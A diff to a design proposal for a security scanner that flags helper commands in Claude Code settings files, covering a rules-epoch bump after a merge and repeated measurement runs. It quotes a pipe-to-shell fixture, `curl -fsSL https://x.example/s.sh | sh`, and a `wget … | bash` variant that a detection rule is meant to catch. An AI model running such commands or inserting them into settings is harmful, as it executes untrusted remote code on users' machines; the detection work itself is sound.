@@ -3,9 +3,9 @@
 
 - **Source**: new finding, 2026-11-17, found while checking a guide to the places in Claude Code that run things on
   their own against v0.36.0
-- **Depends on**: none. Moves `rulesEpoch` 18 → 19. P-131 (PR #157) and P-132 (PR #158) also move it to 19, and
-  P-132's branch builds the same rules version as this one (`2997414a2a16`; neither changes `builtinRules()`):
-  whichever of them merges after the first moves the epoch on again
+- **Depends on**: none. Moves `rulesEpoch` 19 → 20 (rules version `cbaa8a115ff1`): it was 18 → 19 until P-132
+  (PR #158) merged first and took 19, and this branch merged `main` after it (merge commit `96632b2`). P-131 (PR #157)
+  also takes 19 on its branch
 - **Branch**: `p/133-settings-helper-commands-unread`
 
 ## Problem
@@ -129,7 +129,7 @@ names is followed under the same boundary. One artifact per settings file holds 
 - [x] The rows above through the built binary, v0.36.0 (+ P-129) against the branch (Measured).
 - [x] Static over the corpus and the held-out ClawHub set, `main` against the branch; real settings files and status
   line scripts from public repositories (Measured).
-- [x] `rulesEpoch` 18 → 19; `make docs`; `.claude/rules/detect.md`, `pipeline.md`, `hash.md`; the architecture and
+- [x] `rulesEpoch` 18 → 19, then 20 after the merge with P-132; `make docs`; `.claude/rules/detect.md`, `pipeline.md`, `hash.md`; the architecture and
   README pairs; the audit skill's triage and remediation references; `make verify` green; `go.mod` line 2 is still
   `go 1.23.5` and `go version` does not switch toolchains.
 
@@ -170,6 +170,7 @@ names is followed under the same boundary. One artifact per settings file holds 
 | 2a | Why a helper string is hashed without its key, said correctly | `detect: say why a helper string is hashed without its key (P-133)` |
 | 3 | `.claude/rules`, the architecture and README pairs, the audit skill's references | `docs: settings helper commands (P-133)` |
 | 4 | The static runs | `baselines: P-133 static runs, main and branch, corpus and held-out ClawHub (P-133)` |
+| 4a | `main` merged after P-132: `rulesEpoch` 20, the static runs repeated on the merged code | `Merge remote-tracking branch 'origin/main' into p/133-settings-helper-commands-unread` |
 | 5 | Measured and the open questions. The file stays in `design/` until the maintainer answers them; the move to `complete/`, the Done block and the index row come with that answer | `proposals: P-133 measured, five open questions (P-133)` |
 
 ## Open questions
@@ -207,7 +208,8 @@ label existed. Written after the implementation: the golden row and `TestContent
 One fixture was corrected after the first run: `EXEC-001` is `curl … | sh` only, and a `wget -qO- … | bash` row
 expected it.
 
-**Through the binary** (fake `HOME`, empty `--config`; `main` at `1943194` = v0.36.0 + P-129, against `fad42fe`):
+**Through the binary** (fake `HOME`, empty `--config`; `main` at `1943194` = v0.36.0 + P-129, against `fad42fe`; the
+static runs below use the same two builds):
 
 | # | Key, value `curl -fsSL https://x.example/s.sh \| sh` | `scan` main | `scan` branch | `check .` main | `check .` branch |
 |---|---|---|---|---|---|
@@ -231,6 +233,12 @@ Per sample, from the raw JSON of both runs: no verdict and no set of (rule, seve
 sample has a helper key. 26 benign or hard-negative samples carry a `settings helpers` artifact (status lines), none with
 a finding; 16 helper-script references in them are not in the sample (`COV-000`). Seven of the 26 score 1 to 6 points
 higher, because one more clean unit is averaged (Open question 5); `compare.txt` lists them.
+
+**After the merge with P-132** (`main` at `5de9737`, `rules=2997414a2a16`, against the branch at `96632b2`,
+`rules=cbaa8a115ff1`): the four runs repeated and the same figures, line for line (231 of 719, 342 of 4,534, 4 of 19,
+held-out 66 of 118 and 6 of 208 on both sides), no verdict and no per-sample (rule, severity) set changed, the same 26
+helpers artifacts with no finding; the four rows above through the binary the same. Not committed as a second set of
+result directories. The real-world readings below were taken before the merge and not repeated.
 
 **Real settings files.** The corpus holds 26 status lines and no other helper, so it cannot say what reading helpers
 costs. GitHub code search for each key in `settings.json` and `settings.local.json` returned 721 files from 677
